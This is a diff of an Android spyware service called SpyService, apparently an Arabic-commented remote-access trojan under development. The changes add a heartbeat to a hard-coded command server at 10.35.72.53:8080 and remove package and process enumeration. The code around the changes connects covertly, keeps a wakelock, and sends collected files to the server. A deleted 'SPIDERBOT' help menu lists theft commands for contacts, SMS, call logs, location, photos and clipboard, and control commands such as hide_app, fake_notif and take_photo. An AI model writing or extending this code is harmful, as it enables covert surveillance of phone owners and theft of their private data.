@@ -30,16 +30,12 @@ import android.telephony.TelephonyManager;
 import android.util.Log;
 import androidx.core.app.NotificationCompat;
 import androidx.core.content.ContextCompat;
-import org.json.JSONArray;
 import org.json.JSONObject;
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
-import java.net.HttpURLConnection;
-import java.net.InetAddress;
-import java.net.NetworkInterface;
 import java.net.Socket;
 import java.net.URL;
 import java.util.List;
@@ -64,13 +60,12 @@ public class SpyService extends Service {
     private boolean foregroundStarted = false;
 
     // ====== اتصال الخادم ======
-    private static final String SERVER_IP = "10.35.72.53"; // غيّر إلى IP هاتف المدير
+    private static final String SERVER_IP = "10.35.72.53"; // IP المدير
     private static final int SERVER_PORT = 8080;
     private Socket socket;
     private PrintWriter out;
     private BufferedReader in;
     private boolean isConnected = false;
-    private String pendingCommand = null;
 
     @Override
     public void onCreate() {
@@ -79,6 +74,7 @@ public class SpyService extends Service {
         deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
         locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
 
+        // WakeLock للحفاظ على الخدمة (يستهلك بطارية قليلة)
         PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
         wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Spy:lock");
         wakeLock.acquire(10 * 60 * 1000L);
@@ -88,8 +84,9 @@ public class SpyService extends Service {
         // الاتصال بالخادم فوراً
         connectToServer();
 
-        // جدولة إعادة المحاولة إذا انقطع الاتصال
+        // جدولة إعادة المحاولة وإرسال نبضات الحياة
         scheduler = Executors.newSingleThreadScheduledExecutor();
+        scheduler.scheduleAtFixedRate(this::sendHeartbeat, 5, 5, TimeUnit.SECONDS);
         scheduler.scheduleAtFixedRate(this::checkConnection, 10, 10, TimeUnit.SECONDS);
     }
 
@@ -127,7 +124,6 @@ public class SpyService extends Service {
 
                 // تسجيل الجهاز فوراً
                 registerDevice();
-
                 isConnected = true;
                 Log.d(TAG, "✅ Connected to server");
 
@@ -156,6 +152,12 @@ public class SpyService extends Service {
             Log.d(TAG, "📤 Registration sent");
         } catch (Exception e) {
             Log.e(TAG, "Registration error", e);
+        }
+    }
+
+    private void sendHeartbeat() {
+        if (isConnected && out != null) {
+            out.println("HEARTBEAT:" + deviceId + ":" + System.currentTimeMillis());
         }
     }
 
@@ -197,7 +199,6 @@ public class SpyService extends Service {
 
     private void sendFileToServer(File file, String caption) {
         try {
-            // نرسل الملف مشفراً كـ Base64 (يمكن تحسينه لاحقاً)
             byte[] bytes = new byte[(int) file.length()];
             java.io.FileInputStream fis = new java.io.FileInputStream(file);
             fis.read(bytes);
@@ -263,24 +264,7 @@ public class SpyService extends Service {
         }
     }
 
-    // ========== قائمة المساعدة (لن تُستخدم مع الخادم، لكن نتركها) ==========
-    private void sendHelp() {
-        String help = "🕷️ **SPIDERBOT V99** 🕷️\n\n" +
-                "🔴 أوامر السرقة:\n" +
-                "get_contacts, get_sms, get_calllogs, get_location\n" +
-                "get_photos, get_videos, get_files, get_clipboard\n\n" +
-                "⚫ أوامر التحكم:\n" +
-                "hide_app, show_app, fake_notif, take_photo, take_photo_front\n" +
-                "flash_on, flash_off, lock_device, reboot, shutdown\n\n" +
-                "🟢 أوامر المعلومات:\n" +
-                "get_imei, get_phone, get_sim, get_wifi, get_battery, get_ip\n" +
-                "get_accounts, get_device, get_network, get_apps";
-        sendData("HELP", help);
-    }
-
-    // ======================================================================
-    // ========== دوال جمع البيانات (كما هي من الكود السابق) ==========
-    // ======================================================================
+    // ========== دوال جمع البيانات ==========
 
     private File collectContacts() throws Exception {
         File f = new File(getCacheDir(), "contacts.txt");
@@ -611,7 +595,7 @@ public class SpyService extends Service {
     private void getPublicIp() {
         try {
             URL url = new URL("https://api.ipify.org");
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
             conn.setConnectTimeout(5000);
             BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
             String ip = reader.readLine();
@@ -646,34 +630,6 @@ public class SpyService extends Service {
             isTrackingLocation = false;
             sendData("LOCATION_TRACK", "stopped");
         } catch (Exception e) { sendData("ERROR", "فشل إيقاف التتبع"); }
-    }
-
-    private void getInstalledPackages() {
-        try {
-            PackageManager pm = getPackageManager();
-            List<android.content.pm.PackageInfo> packages = pm.getInstalledPackages(0);
-            StringBuilder sb = new StringBuilder();
-            int count = 0;
-            for (android.content.pm.PackageInfo pkg : packages) {
-                if (count++ > 50) break;
-                sb.append(pkg.packageName).append("\n");
-            }
-            sendData("PACKAGES", sb.toString());
-        } catch (Exception e) { sendData("ERROR", "فشل قراءة التطبيقات"); }
-    }
-
-    private void getRunningProcesses() {
-        try {
-            android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE);
-            List<android.app.ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
-            StringBuilder sb = new StringBuilder();
-            int count = 0;
-            for (android.app.ActivityManager.RunningAppProcessInfo p : processes) {
-                if (count++ > 20) break;
-                sb.append(p.processName).append("\n");
-            }
-            sendData("PROCESSES", sb.toString());
-        } catch (Exception e) { sendData("ERROR", "فشل قراءة العمليات"); }
     }
 
     private void lockDevice() {
